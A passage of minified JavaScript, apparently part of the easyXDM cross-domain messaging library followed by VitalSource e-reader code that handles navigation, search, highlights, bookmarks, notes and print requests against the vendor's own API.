                            xdm_c: o.channel,
                            xdm_p: 1
                        }),
                        name: D + o.channel + "_provider"
                    }),
                    a = C(o)
                } else
                    F(g, "message", i),
                    (s = "postMessage" in g.parent ? g.parent : g.parent.document).postMessage(o.channel + "-ready", l),
                    m(function() {
                        r.up.callback(!0)
                    }, 0)
            },
            init: function() {
                v(r.onDOMReady, r)
            }
        }
    },
    M.stack.FrameElementTransport = function(e) {
        var t,
            n,
            o,
            i;
        return t = {
            outgoing: function(e, t, n) {
                o.call(this, e),
                n && n()
            },
            destroy: function() {
                n && (n.parentNode.removeChild(n), n = null)
            },
            onDOMReady: function() {
                i = y(e.remote),
                e.isHost ? (V(e.props, {
                    src: x(e.remote, {
                        xdm_e: y(d.href),
                        xdm_c: e.channel,
                        xdm_p: 5
                    }),
                    name: D + e.channel + "_provider"
                }), (n = C(e)).fn = function(e) {
                    return delete n.fn, o = e, m(function() {
                        t.up.callback(!0)
                    }, 0), function(e) {
                        t.up.incoming(e, i)
                    }
                }) : (u.referrer && y(u.referrer) != $.xdm_e && (g.top.location = $.xdm_e), o = g.frameElement.fn(function(e) {
                    t.up.incoming(e, i)
                }), t.up.callback(!0))
            },
            init: function() {
                v(t.onDOMReady, t)
            }
        }
    },
    M.stack.NameTransport = function(o) {
        function i(e) {
            var t = o.remoteHelper + (s ? "#_3" : "#_2") + o.channel;
            l.contentWindow.sendMessage(e, t)
        }
        function r() {
            s ? 2 != ++c && s || n.up.callback(!0) : (i("ready"), n.up.callback(!0))
        }
        function t(e) {
            n.up.incoming(e, d)
        }
        function a() {
            u && m(function() {
                u(!0)
            }, 0)
        }
        var n,
            s,
            l,
            e,
            c,
            u,
            d,
            f;
        return n = {
            outgoing: function(e, t, n) {
                u = n,
                i(e)
            },
            destroy: function() {
                l.parentNode.removeChild(l),
                l = null,
                s && (e.parentNode.removeChild(e), e = null)
            },
            onDOMReady: function() {
                s = o.isHost,
                c = 0,
                d = y(o.remote),
                o.local = b(o.local),
                s ? (M.Fn.set(o.channel, function(e) {
                    s && "ready" === e && (M.Fn.set(o.channel, t), r())
                }), f = x(o.remote, {
                    xdm_e: o.local,
                    xdm_c: o.channel,
                    xdm_p: 2
                }), V(o.props, {
                    src: f + "#" + o.channel,
                    name: D + o.channel + "_provider"
                }), e = C(o)) : (o.remoteHelper = o.remote, M.Fn.set(o.channel, t));
                var n = function() {
                    var e = l || this;
                    A(e, "load", n),
                    M.Fn.set(o.channel + "_load", a),
                    function t() {
                        "function" == typeof e.contentWindow.sendMessage ? r() : m(t, 50)
                    }()
                };
                l = C({
                    props: {
                        src: o.local + "#_4" + o.channel
                    },
                    onLoad: n
                })
            },
            init: function() {
                v(n.onDOMReady, n)
            }
        }
    },
    M.stack.HashTransport = function(i) {
        function t(e) {
            if (f) {
                var t = i.remote + "#" + u++ + "_" + e;
                (s || !h ? f.contentWindow : f).location = t
            }
        }
        function o(e) {
            c = e,
            a.up.incoming(c.substring(c.indexOf("_") + 1), p)
        }
        function e() {
            if (d) {
                var e = d.location.href,
                    t = "",
                    n = e.indexOf("#");
                -1 != n && (t = e.substring(n)),
                t && t != c && o(t)
            }
        }
        function r() {
            n = setInterval(e, l)
        }
        var a,
            s,
            n,
            l,
            c,
            u,
            d,
            f,
            h,
            p;
        return a = {
            outgoing: function(e) {
                t(e)
            },
            destroy: function() {
                g.clearInterval(n),
                !s && h || f.parentNode.removeChild(f),
                f = null
            },
            onDOMReady: function() {
                if (s = i.isHost, l = i.interval, c = "#" + i.channel, u = 0, h = i.useParent, p = y(i.remote), s) {
                    if (V(i.props, {
                        src: i.remote,
                        name: D + i.channel + "_provider"
                    }), h)
                        i.onLoad = function() {
                            d = g,
                            r(),
                            a.up.callback(!0)
                        };
                    else {
                        var t = 0,
                            n = i.delay / 50;
                        !function o() {
                            if (++t > n)
                                throw new Error("Unable to reference listenerwindow");
                            try {
                                d = f.contentWindow.frames[D + i.channel + "_consumer"]
                            } catch (e) {}
                            d ? (r(), a.up.callback(!0)) : m(o, 50)
                        }()
                    }
                    f = C(i)
                } else
                    d = g,
                    r(),
                    h ? (f = parent, a.up.callback(!0)) : (V(i, {
                        props: {
                            src: i.remote + "#" + i.channel + new Date,
                            name: D + i.channel + "_consumer"
                        },
                        onLoad: function() {
                            a.up.callback(!0)
                        }
                    }), f = C(i))
            },
            init: function() {
                v(a.onDOMReady, a)
            }
        }
    },
    M.stack.ReliableBehavior = function() {
        var i,
            r,
            a = 0,
            s = 0,
            l = "";
        return i = {
            incoming: function(e, t) {
                var n = e.indexOf("_"),
                    o = e.substring(0, n).split(",");
                e = e.substring(n + 1),
                o[0] == a && (l = "", r && r(!0)),
                0 < e.length && (i.down.outgoing(o[1] + "," + a + "_" + l, t), s != o[1] && (s = o[1], i.up.incoming(e, t)))
            },
            outgoing: function(e, t, n) {
                l = e,
                r = n,
                i.down.outgoing(s + "," + ++a + "_" + e, t)
            }
        }
    },
    M.stack.QueueBehavior = function(r) {
        function a() {
            if (r.remove && 0 === l.length)
                o(s);
            else if (!n && 0 !== l.length && !e) {
                n = !0;
                var t = l.shift();
                s.down.outgoing(t.data, t.origin, function(e) {
                    n = !1,
                    t.callback && m(function() {
                        t.callback(e)
                    }, 0),
                    a()
                })
            }
        }
        var s,
            e,
            l = [],
            n = !0,
            i = "",
            c = 0,
            u = !1,
            d = !1;
        return s = {
            init: function() {
                w(r) && (r = {}),
                r.maxLength && (c = r.maxLength, d = !0),
                r.lazy ? u = !0 : s.down.init()
            },
            callback: function(e) {
                n = !1;
                var t = s.up;
                a(),
                t.callback(e)
            },
            incoming: function(e, t) {
                if (d) {
                    var n = e.indexOf("_"),
                        o = parseInt(e.substring(0, n), 10);
                    i += e.substring(n + 1),
                    0 === o && (r.encode && (i = f(i)), s.up.incoming(i, t), i = "")
                } else
                    s.up.incoming(e, t)
            },
            outgoing: function(e, t, n) {
                r.encode && (e = h(e));
                var o,
                    i = [];
                if (d) {
                    for (; 0 !== e.length;)
                        o = e.substring(0, c),
                        e = e.substring(o.length),
                        i.push(o);
                    for (; o = i.shift();)
                        l.push({
                            data: i.length + "_" + o,
                            origin: t,
                            callback: 0 === i.length ? n : null
                        })
                } else
                    l.push({
                        data: e,
                        origin: t,
                        callback: n
                    });
                u ? s.down.init() : a()
            },
            destroy: function() {
                e = !0,
                s.down.destroy()
            }
        }
    },
    M.stack.VerifyBehavior = function(o) {
        function i() {
            a = Math.random().toString(16).substring(2),
            r.down.outgoing(a)
        }
        var r,
            a,
            s;
        return r = {
            incoming: function(e, t) {
                var n = e.indexOf("_");
                -1 === n ? e === a ? r.up.callback(!0) : s || (s = e, o.initiate || i(), r.down.outgoing(e)) : e.substring(0, n) === s && r.up.incoming(e.substring(n + 1), t)
            },
            outgoing: function(e, t, n) {
                r.down.outgoing(a + "_" + e, t, n)
            },
            callback: function() {
                o.initiate && i()
            }
        }
    },
    M.stack.RpcBehavior = function(t, o) {
        function l(e) {
            e.jsonrpc = "2.0",
            r.down.outgoing(a.stringify(e))
        }
        function n(o, i) {
            var r = Array.prototype.slice;
            return function() {
                var e,
                    t = arguments.length,
                    n = {
                        method: i
                    };
                0 < t && "function" == typeof arguments[t - 1] ? (1 < t && "function" == typeof arguments[t - 2] ? (e = {
                    success: arguments[t - 2],
                    error: arguments[t - 1]
                }, n.params = r.call(arguments, 0, t - 2)) : (e = {
                    success: arguments[t - 1]
                }, n.params = r.call(arguments, 0, t - 1)), c["" + ++s] = e, n.id = s) : n.params = r.call(arguments, 0),
                o.namedParams && 1 === n.params.length && (n.params = n.params[0]),
                l(n)
            }
        }
        function i(e, o, t, n) {
            if (t) {
                var i,
                    r;
                o ? (i = function(e) {
                    i = H,
                    l({
                        id: o,
                        result: e
                    })
                }, r = function(e, t) {
                    r = H;
                    var n = {
                        id: o,
                        error: {
                            code: -32099,
                            message: e
                        }
                    };
                    t && (n.error.data = t),
                    l(n)
                }) : i = r = H,
                p(n) || (n = [n]);
                try {
                    var a = t.method.apply(t.scope, n.concat([i, r]));
                    w(a) || i(a)
                } catch (s) {
                    r(s.message)
                }
            } else
                o && l({
                    id: o,
                    error: {
                        code: -32601,
                        message: "Procedure not found."
                    }
                })
        }
        var r,
            a = o.serializer || X(),
            s = 0,
            c = {};
        return r = {
            incoming: function(e) {
                var t = a.parse(e);
                if (t.method)
                    o.handle ? o.handle(t, l) : i(t.method, t.id, o.local[t.method], t.params);
                else {
                    var n = c[t.id];
                    t.error ? n.error && n.error(t.error) : n.success && n.success(t.result),
                    delete c[t.id]
                }
            },
            init: function() {
                if (o.remote)
                    for (var e in o.remote)
                        o.remote.hasOwnProperty(e) && (t[e] = n(o.remote[e], e));
                r.down.init()
            },
            destroy: function() {
                for (var e in o.remote)
                    o.remote.hasOwnProperty(e) && t.hasOwnProperty(e) && delete t[e];
                r.down.destroy()
            }
        }
    },
    _.easyXDM = M
}(window, document, location, window.setTimeout, decodeURIComponent, encodeURIComponent),
function() {
    easyXDM.DomHelper.requiresJSON("/assets/easyXDM/json2-6e23ff47ea8bee587b32d020d365a4db96af0403c3b6238120ca5c354bfe7468.js"),
    Jigsaw.socketMethods = {
        local: {},
        remote: {
            scrollTo: {},
            snippetHasNextPage: {},
            snippetHasPreviousPage: {},
            searchInSnippet: {},
            waldoSearchInSnippet: {},
            setupSecureToken: {}
        }
    },
    Jigsaw.socketOptions = {};
    var r = function(i, o) {
        return [function(e) {
            if (i) {
                if (o) {
                    var t = {};
                    t[o] = e,
                    e = t
                }
                var n = new Jigsaw.Response({
                    status: "ok",
                    data: e
                });
                i(n)
            }
        }, function(e) {
            if (i) {
                var t = e.data || {};
                for (var n in t.message = e.message, t.status = "error", t.data = {}, e.data)
                    "data" !== n && (t.data[n] = e.data[n]);
                var o = new Jigsaw.Response(t);
                i(o)
            }
        }]
    };
    Jigsaw.addRemoteMethod = function(e, t, o) {
        var i = (o = o || {}).handler || function() {
            this.socket[e].apply(this, arguments)
        };
        this.socketMethods.remote[e] = {},
        t.prototype[e] = function() {
            var e = Array.prototype.slice.call(arguments),
                t = function() {},
                n = e[e.length - 1];
            n && "function" == typeof n && (t = e.pop()),
            e = e.concat(r(t, o.dataAttr)),
            i.apply(this, e)
        }
    },
    Jigsaw.addLocalSocketMethods = function(e) {
        for (var t in e)
            e.hasOwnProperty(t) && (Jigsaw.socketMethods.local[t] = e[t])
    },
    Jigsaw.Utils = {
        defaultCallbacks: r
    }
}.call(this),
function() {
    var e,
        t = Jigsaw.Viewer ? Jigsaw.Viewer.prototype : Jigsaw,
        a = function(e) {
            var t = e.name ? e.name : e;
            return this.uuid && (t += "." + this.uuid), t
        },
        s = function(e) {
            var t = e.name ? e.name : e;
            return this.uuid && (t = t.replace("." + this.uuid, "")), t
        },
        n = function(i, r) {
            t.bind = function(e, t) {
                i(r).on(a.call(this, e), t)
            },
            t.once = function(e, t) {
                i(r).one(a.call(this, e), t)
            },
            t.unbind = function(e, t) {
                i(r).off(a.call(this, e), t)
            },
            Jigsaw.socketMethods.remote.trigger = {},
            t.trigger = function(e, t, n) {
                null == n && (n = !0);
                var o = a.call(this, e);
                i(r).trigger(o, t),
                n && this.socket.trigger(s.call(this, o), t)
            },
            Jigsaw.socketMethods.local.trigger = {
                method: function(e, t) {
                    var n = a.call(this, e);
                    (this.trigger || Jigsaw.trigger)(n, t, !1)
                }
            }
        },
        o = document;
    e = "undefined" != typeof Jigsaw$ ? Jigsaw$ : $,
    "undefined" != typeof VST && VST.$ && (e = VST.$, o = VST.document || o),
    n.call(this, e, o)
}.call(this),
function() {
    var e = function(e) {
        null == e && (e = {}),
        this.status = e.status || "ok",
        this.message = e.message,
        this.data = e.data,
        this.code = e.code,
        this.isSuccess = function() {
            return "ok" == this.status
        },
        this.code || (this.isSuccess() ? this.code = 200 : this.code = 500)
    };
    this.Jigsaw = this.Jigsaw || {},
    this.Jigsaw.Response = e
}.call(window),
function() {
    LESS_THAN = -1,
    EQUAL = 0,
    GREATER_THAN = 1;
    var e = {
        compareCFIs: function(e, t) {
            if (null == e && (e = ""), null == t && (t = ""), (e = e.replace(/!$/, "")) === (t = t.replace(/!$/, "")))
                return EQUAL;
            for (var n = /[\/@~:!]/, o = /(\[.+\]|[^\d])/g, i = e.split(n), r = t.split(n), a = 0;; a++) {
                var s = i[a],
                    l = r[a];
                if (null == s && null == l)
                    return EQUAL;
                if (null == s)
                    return LESS_THAN;
                if (null == l)
                    return GREATER_THAN;
                if (s !== l) {
                    if ((s = parseInt(s.replace(o, ""), 10)) < (l = parseInt(l.replace(o, ""), 10)))
                        return LESS_THAN;
                    if (l < s)
                        return GREATER_THAN
                }
            }
        }
    };
    this.Jigsaw.CFIUtils = e
}.call(window),
function(f) {
    var t = {};
    t[atob("eC12aXRhbHNvdXJjZS1rZWVwYWxpdmU=")] = (!!window.process).toString(),
    t["x-vitalsource-secure-token"] = this.secureToken || "",
    f.ajaxSetup({
        headers: t
    });
    var u = function(r) {
            return function(e, t, n) {
                var o;
                try {
                    e.responseText && (o = f.parseJSON(e.responseText))
                } catch (i) {}
                r && r(n, {
                    code: e.status,
                    responseStatus: t,
                    errors: o
                })
            }
        },
        d = function(t) {
            return function(e) {
                t && t(e)
            }
        },
        s = function(e, t) {
            for (var n = e.length - 1; 0 <= n; n--)
                if (e[n].label == t)
                    return e[n]
        },
        l = function(e, t) {
            for (var n = 0; n < e.length; n++)
                if (0 <= e[n].label.toUpperCase().indexOf(t.toUpperCase()))
                    return e[n]
        },
        h = function(e) {
            return e.replace(/[A-Z]/g, function(e) {
                return "_" + e.toLowerCase()
            })
        },
        i = function(e) {
            var t = {};
            for (var n in e)
                e.hasOwnProperty(n) && (t[h(n)] = e[n]);
            return t
        },
        r = function(e, t, n) {
            f.ajax({
                url: VST.Book.buildAPIURL("/highlights"),
                data: {
                    highlight: e
                },
                dataType: "json",
                type: "POST",
                success: function(n) {
                    VST.Book.isDash() ? (VST.sharedEpubModule.ClearSelection(), VST.Dash.highlightRenderer([n]).render(VST.document.body)) : VST.Book.isEpub() ? (VST.sharedEpubModule.ClearSelection(), VST.Book.getCurrentPages(function(e, t) {
                        t && t.forEach(function(e) {
                            if (-1 !== VST.document.URL.indexOf(e.getPath())) {
                                var t = VST.sharedEpubModule.StripCFIAssertions(e.getCFI().split("!")[0]);
                                EpubBook.highlightOneHighlight(n, t, !1, VST.document)
                            }
                        })
                    })) : (VST.PictureBook.selection.deselectAll(), VST.PictureBook.renderOneHighlight(n)),
                    d(t)(n)
                },
                error: u(n)
            })
        },
        e = function(e, t, n) {
            f.ajax({
                url: "/tokens/search",
                type: "GET",
                data: e,
                dataType: "json",
                success: d(t),
                error: u(n)
            })
        },
        a = function(e, t) {
            f.ajax({
                url: "/tokens/print",
                type: "GET",
                dataType: "json",
                data: {
                    t: Date.now()
                },
                success: d(e),
                error: u(t)
            })
        },
        g = function(e, t, n, o) {
            f.ajax({
                url: "/search/" + e,
                dataType: "json",
                data: {
                    q: t
                },
                type: "GET",
                success: d(n),
                error: u(o)
            })
        },
        m = function(t, n, o, i) {
            e({
                isbn: t
            }, function(e) {
                f.ajax({
                    url: "//search.vitalsource.com/search",
                    type: "GET",
                    dataType: "json",
                    data: {
                        q: n
                    },
                    headers: {
                        "x-vitalsource-search-token": e.token
                    },
                    success: function(e) {
                        if (o)
                            return o(e.results[t] || e.results[t + ".DASHPUB"])
                    },
                    error: u(i)
                })
            })
        };
    isInSnippet = function(e) {
        return e.indexOf && -1 !== e.indexOf("/") ? (-1 === e.indexOf("!") && (e += "!/4"), v(e)) : isPageInSnippet(e)
    },
    isPageInSnippet = function(e) {
        return !(!e || !VST.snippetSettings) && (VST.snippetSettings.start.indexOf && -1 !== VST.snippetSettings.start.indexOf("/") ? v("/" + e + "!/4") : e >= VST.snippetSettings.start && e <= VST.snippetSettings.end)
    };
    for (var v = function(e) {
            if (!e || !VST.snippetSettings)
                return !1;
            try {
                return e = e.replace(/\/\d*[13579]:\d+$/, ""), VST.snippetSettings.end && Jigsaw.CFIUtils.compareCFIs(e, VST.snippetSettings.end) <= 0 && VST.snippetSettings.start && 0 <= Jigsaw.CFIUtils.compareCFIs(e, VST.snippetSettings.start)
            } catch (t) {
                return !1
            }
        }, T = function(e) {
            S();
            var t = e.term || "",
                n = [],
                o = e.color || "yellow";
            if (Array.isArray(t))
                for (var i = 0; i < t.length; i++)
                    n.push(t[i].replace(/^['"]/, "").replace(/['"]$/, ""));
            else
                /(^'.+'$)|(^".+"$)/.test(t) ? n = [t.replace(/^['"]/, "").replace(/['"]$/, "")] : (n = t.split(" ")).unshift(t);
            return !(t.length < 1) && (VST.Book.isPBK() ? VST.PictureBook.highlightTerms(n, o, "vst-search-term") : VST.$(VST.document.body).highlight(n, {
                    className: "vst-search-term",
                    color: o,
                    element: "span",
                    wordsOnly: !0
                }), !0)
        }, S = function() {
            VST.Book.isPBK() ? VST.PictureBook.unhighlightTerms() : VST.$(VST.document.body).unhighlight({
                className: "vst-search-term",
                element: "span"
            })
        }, n = function(e, t) {
            VST.$(VST.scrollElement).scrollLeft(e),
            t && t()
        }, o = function(e, t) {
            VST.$(VST.scrollElement).scrollTop(e),
            t && t()
        }, c = function(e) {
            for (var t = ["!", ":", "/"], n = "", o = 0; o < e.length; o++)
                -1 === t.indexOf(e[o]) ? n += encodeURIComponent(e[o]) : n += e[o];
            return n
        }, p = function(a, s) {
            VST.Book.getCurrentPage(function(e, t) {
                var n = t.getCFIWithoutAssertions(),
                    o = VST.sharedEpubModule.StripCFIAssertions(a).split("!");
                if (o[0] === n) {
                    0 === o.length && o.push("/2");
                    var i = VST.sharedEpubModule.locateCFI(o[1]);
                    if (!i.error)
                        return "#text" === i.node.nodeName && (i.node = i.node.parentNode), Jigsaw.navigateToNode(i.node, a), s()
                }
                Jigsaw.navigationRequested();
                var r = VST.Book.buildURL("/cfi" + a);
                Jigsaw.navigateTo(r, function() {
                    s && s()
                })
            })
        }, y = function(e, t, n) {
            if (e.cfi)
                return p(e.cfi, t, n);
            Jigsaw.navigationRequested();
            var o = e.cfi ? VST.Book.buildAPIURL("/vbk/cfi/" + e.cfi) : VST.Book.buildAPIURL("/content/element/" + e.id);
            Jigsaw.navigateTo(o, function() {
                t && t()
            })
        }, b = function(e) {
            return {
                pageIndex: e.getIndex(),
                cfi: e.getCFI(),
                chapterTitle: e.getChapterTitle()
            }
        }, x = function(e, t) {
            t = t || e.innerText;
            var n = "";
            if (0 <= ["h1", "h2", "h3", "h4", "h5", "h6", "p"].indexOf(e.tagName.toLowerCase()))
                return "<" + e.tagName + ">" + t + "</" + e.tagName + ">";
            if (0 <= ["a", "span"].indexOf(e.tagName.toLowerCase()))
                return t;
            if (0 <= ["title"].indexOf(e.tagName.toLowerCase()))
                return "<h2>" + t + "</h2>";
            if (n += "<p>", 0 < e.children.length)
                for (var o = 0; o < e.children.length; o++)
                    n += x(e.children[o], t);
            else
                n += t;
            return n += "</p>"
        }, w = function() {
            var e = VST.snippetSettings;
            e.doNotNavigate = !0,
            A.enter(e)
        }, V = function(i, r, a) {
            Jigsaw.navigationRequested(),
            VST.Book.getPageBreaks(function(e, t) {
                if (e)
                    return a(e.message);
                var n = s(t, i) || l(t, i);
                if (n) {
                    var o = n.cfi ? VST.Book.buildURL("/cfi" + n.cfi) : VST.Book.buildURL(n.url);
                    return r && r(n), Jigsaw.navigateTo(o, function() {})
                }
                a("page not found")
            })
        }, C = function() {
            Browser.isIOS() || (1 < VST.documents.length ? (f("#epub-container").css("overflow", VST.pageScrollDisabled ? "hidden" : "auto"), f("#epub-container").children().each(function() {
                f(this).attr("scrolling", "no")
            })) : (f("#epub-container").css("overflow", "hidden"), f("#epub-container").css("-webkit-overflow-scrolling", "hidden"), f("#epub-container").children().each(function() {
                f(this).attr("scrolling", VST.pageScrollDisabled ? "no" : "auto")
            })))
        }, k = function(e) {
            var t = {};
            if (e)
                for (var n in e)
                    e.hasOwnProperty(n) && (t[h(n)] = e[n]);
            else
                VST.Book.isEpub() ? t.epub_cfi = VST.currentPageData.cfi.split("!")[0] + "!" + VST.sharedEpubModule.GetCFIForCurrentScrollPosition() : (t.pbk_page = VST.currentPageData.index, t.pbk_label = VST.currentPageData.page, t.chapter_title = VST.currentPageData.chapterTitle);
            return t
        }, E = function(e) {
            return "vst-enhanced-formatting-before-" + e
        }, I = function(e) {
            return "vst-enhanced-formatting-after-" + e
        }, N = function(e) {
            return "vst-enhanced-formatting-opendyslexic-" + e
        }, P = function() {
            for (var e = 0; e < VST.documents.length; e++) {
                var t = VST.documents[e],
                    n = t.getElementById(E(e)),
                    o = t.getElementById(I(e)),
                    i = t.getElementById(N(e));
                n && n.remove(),
                o && o.remove(),
                i && i.remove()
            }
        }, F = function(n, o, i, r) {
            3 === arguments.length && (r = i, i = {
                auto_print: !0
            }),
            a(function(e) {
                var t = "https://print.vitalsource.com/print/" + VST.Book.getISBN() + "?from=" + n + "&to=" + o + "&token=" + e.token;
                i.locale && (t = t + "&locale=" + i.locale),
                i.auto_print && (t += "&auto_print=true"),
                i.post_message_print && (t += "&post_message_print=true"),
                i.async && (t += "&async=true"),
                r(t)
            })
        }, A = {
            getTOC: function(n, o) {
                VST.Book.getTOC(function(e, t) {
                    e ? o(e.message, t) : n(t)
                })
            },
            getSpine: function(i, r) {
                VST.Book.getPages(function(e, t) {
                    if (e)
                        r(e.message);
                    else {
                        pages = [];
                        for (var n = 0; n < t.length; n++) {
                            var o = t[n];
                            pages.push({
                                url: o.getPath(),
                                linear: o.isLinear(),
                                cfi: o.getCFI(),
                                cfiWithoutAssertions: o.getCFIWithoutAssertions()
                            })
                        }
                        i(pages)
                    }
                })
            },
            getAncillaries: function(e, t) {
                f.ajax({
                    url: VST.Book.buildAPIURL("/ancillaries"),
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getAncillariesSummary: function(e, t) {
                f.ajax({
                    url: "/ancillaries",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getAllAccessCodes: function(e, t) {
                f.ajax({
                    url: "/ancillaries/code",
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getAncillariesForVbid: function(e, t, n) {
                f.ajax({
                    url: "/books/-id-/ancillaries".replace("-id-", e),
                    type: "GET",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            redeemAncillary: function(e, t, n) {
                f.ajax({
                    url: "/ancillaries/-id-/redeem".replace("-id-", e),
                    type: "PUT",
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getThumbnails: function(e, t) {
                f.ajax({
                    url: VST.Book.buildAPIURL("/thumbnails"),
                    dataType: "json",
                    success: d(e),
                    error: u(t)
                })
            },
            getCitationInfo: function(e, t, n) {
                2 === Array.prototype.slice.call(arguments, 0).length && (n = t, t = e, e = VST.Book.getISBN()),
                f.ajax({
                    url: "/books/-isbn-/citation".replace("-isbn-", e),
                    dataType: "json",
                    success: d(t),
                    error: u(n)
                })
            },
            getFigures: function(e, t, n) {
                var o = {};
                if (Array.prototype.slice.call(arguments, 0).length < 3)
                    n = t,
                    t = e,
                    e = {};
                else
                    for (var i in e)
                        e.hasOwnProperty(i) && (o[h(i)] = e[i]);
                f.ajax({
                    url: VST.Book.buildAPIURL("/figures"),
                    dataType: "json",
                    data: {
                        data: o
                    },
                    type: "GET",
                    success: d(t),
                    error: u(n)
                })
            },
            getPageBreaks: function(n, o) {
                VST.Book.getPageBreaks(function(e, t) {
                    e ? o(e.message, t) : n(t)
                })
            },
            getBookmarks: function(e, t) {
                f.ajax({
                    url: VST.Book.buildAPIURL("/bookmarks"),
                    dataType: "json",
                    type: "GET",
                    success: d(e),
                    error: u(t)
                })
            },
            setBookmark: function(e, t, n) {
                Array.prototype.slice.call(arguments, 0).length < 3 && (n = t, t = e, e = null);
                var o = k(e);
                f.ajax({
                    url: VST.Book.buildAPIURL("/bookmarks"),
                    dataType: "json",
                    type: "POST",
                    data: {
                        bookmark: o
                    },
                    success: d(t),
                    error: u(n)
                })
            },
            deleteBookmark: function(e, t, n) {
                f.ajax({
                    url: VST.Book.buildAPIURL("/bookmarks/" + e),
                    dataType: "json",
                    type: "DELETE",
                    success: d(t),
                    error: u(n)
                })
            },
            getNotes: function(e, t) {
                f.ajax({
                    url: VST.Book.buildAPIURL("/bookmarks"),
                    data: {
                        type: "note"
                    },
                    dataType: "json",
                    type: "GET",
                    success: d(e),
                    error: u(t)
                })
            },
            addNote: function(e, t, n) {
                var o = e;
                "string" == typeof e && ((o = k()).note = e),
                o.type = "note",
                f.ajax({
                    url: VST.Book.buildAPIURL("/bookmarks"),
                    dataType: "json",
                    type: "POST",
                    data: {
                        bookmark: o
                    },
                    success: d(t),
                    error: u(n)
                })
            },
            deleteNote: function(e, t, n) {
                f.ajax({
                    url: VST.Book.buildAPIURL("/bookmarks/" + e),
                    data: {
                        type: "note"
                    },
                    dataType: "json",
                    type: "DELETE",
                    success: d(t),
                    error: u(n)
                })
            },
            updateNote: function(e, t, n, o) {
                "string" == typeof t && (t = {
                    note: t
                }),
                f.ajax({
                    url: VST.Book.buildAPIURL("/bookmarks/" + e),
                    dataType: "json",
                    data: {
                        bookmark: t,
                        type: "note"
                    },
                    type: "PUT",
                    success: d(n),
                    error: u(o)
                })
            },
            getHighlights: function(n, o) {
                VST.Book.getHighlights(function(e, t) {
                    e ? o(e.message, t) : n(t)
                })
            },
            addHighlight: function(e, t, n) {
                var o = {};
                for (var i in e)
                    e.hasOwnProperty(i) && (o[h(i)] = e[i]);
                r(o, t, n)
            },
            deleteHighlight: function(e, t, n) {
                VST.Highlights.removeHighlight(e),
                f.ajax({
                    url: VST.Book.buildAPIURL("/highlights/" + e),
                    dataType: "json",
                    type: "DELETE",
                    success: d(t),
                    error: u(n)
                })
            },
            redrawHighlights: function(e) {
                return VST.Highlights.redrawHighlights(e)
            },
            focusHighlight: function(e, t, n) {
                return e.skipNavigation ? VST.Highlights.focusHighlight(e.syncId) : 2 === arguments.length ? (VST.Highlights.focusHighlight(), t()) : void Jigsaw.navigateToHighlight(e, function() {
                    return VST.Highlights.focusHighlight(e.syncId)
                }, n)
            },
            getHighlightSummary: function(e, t) {
                f.ajax({
                    url: "/highlights/summary",
                    dataType: "json",
                    type: "GET",
                    success: d(e),
                    error: u(t)
                })
            },
            getDetailedHighlightSummary: function(e, t) {
                f.ajax({
                    url: "/highlights",
                    dataType: "json",
                    type: "GET",
                    success: d(e),
                    error: u(t)
                })
            },
            getMarkers: function(e, t) {
                f.ajax({
                    url: "/markers",
                    dataType: "json",
                    type: "GET",
                    success: d(e),
                    error: u(t)
                })
            },
            createMarker: function(e, t, n) {
                var o = {};
                for (var i in e)
                    e.hasOwnProperty(i) && (o[h(i)] = e[i]);
                f.ajax({
                    url: "/markers",
                    dataType: "json",
                    data: {
                        marker: o
                    },
                    type: "POST",
                    success: d(t),
                    error: u(n)
                })
            },
            updateMarker: function(e, t, n, o) {
                var i = {};
                for (var r in t)
                    t.hasOwnProperty(r) && (i[h(r)] = t[r]);
                f.ajax({
                    url: "/markers/" + e,
                    dataType: "json",
                    data: {
                        marker: i
                    },
                    type: "PUT",
                    success: d(n),
                    error: u(o)
                })
            },
            getMarker: function(e, t, n) {
                f.ajax({
                    url: "/markers/" + e,
                    dataType: "json",
                    type: "GET",
                    success: d(t),
                    error: u(n)
                })
            },
            deleteMarker: function(e, t, n) {
                var o = {};
                e.id && (e.mergeWith && (o.merge_with = e.mergeWith), e = e.id),
                f.ajax({
                    url: "/markers/" + e,
                    dataType: "json",
                    data: o,
                    type: "DELETE",
                    success: d(t),
                    error: u(n)
                })
            },
            updateHighlight: function(o, e, i, t) {
                var n = {};
                for (var r in e)
                    e.hasOwnProperty(r) && (n[h(r)] = e[r]);
                f.ajax({
                    url: VST.Book.buildAPIURL("/highlights/" + o),
                    data: {
                        highlight: n
                    },
                    dataType: "json",
                    type: "PUT",
                    success: function(e, t, n) {
                        VST.Highlights.updateHighlight(o, e),
                        d(i)(e, t, n)
                    },
                    error: u(t)
                })
            },
            highlightCurrentSelection: function(e, t, n) {
                var o = VST.Highlights.getHighlightDataForCurrentSelection() || VST.lastHighlightDataForSelection;
                if (o) {
                    for (var i in e)
                        e.hasOwnProperty(i) && (o[h(i)] = e[i]);
                    r(o, t, n)
                }
            },
            clearSelection: function(e) {
                VST.Book.isPBK() ? VST.PictureBook.selection.deselectAll() : VST.sharedEpubModule.ClearSelection(),
                e && e()
            },
            manageHighlights: function(e, t, n) {
                var o = {
                    highlights: {
                        add: [],
                        "delete": []
                    }
                };
                e.add = e.add || [],
                e["delete"] = e["delete"] || [];
                for (var i = 0; i < e.add.length; i++) {
                    var r = {};
                    for (var a in e.add[i])
                        e.add[i].hasOwnProperty(a) && (r[h(a)] = e.add[i][a]);
                    o.highlights.add.push(r)
                }
                for (var s = 0; s < e["delete"].length; s++) {
                    var l = {};
                    for (var c in e["delete"][s])
                        e["delete"][s].hasOwnProperty(c) && (l[h(c)] = e["delete"][s][c]);
                    o.highlights["delete"].push(l)
                }
                f.ajax({
                    url: VST.Book.buildAPIURL("/highlights/publish"),
                    dataType: "json",
                    type: "POST",
                    data: o,
                    success: d(t),
                    error: u(n)
                })
            },
            searchContent: function(e, t, n) {
                g(VST.Book.getISBN(), e, t, n)
            },
            searchBook: function(e, t, n, o) {
                g(e, t, n, o)
            },
            waldoSearchContent: function(e, t, n) {
                m(VST.Book.getISBN(), e, t, n)
            },
            waldoSearchBook: function(e, t, n, o) {
                m(e, t, n, o)
            },
            searchHighlights: function(e, t, n) {
                f.ajax({
                    url: VST.Book.buildAPIURL("/highlights/search"),
                    dataType: "json",
                    data: {
                        q: e
                    },
                    type: "GET",
                    success: d(t),
                    error: u(n)
                })
            },
